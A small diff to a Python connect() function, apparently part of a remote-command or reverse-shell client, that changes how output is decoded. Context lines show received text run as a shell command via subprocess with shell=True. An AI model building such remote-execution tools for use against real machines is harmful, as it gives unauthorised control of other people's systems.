@@ -59,7 +59,7 @@ def connect():
         # A pipe has two endpoints
         CMD = subprocess.Popen(plaintext, shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         
-        plaintext = CMD.stdout.read()
+        plaintext = CMD.stdout.read().decode()
         print(plaintext)
         
         #convert byte to string!!!
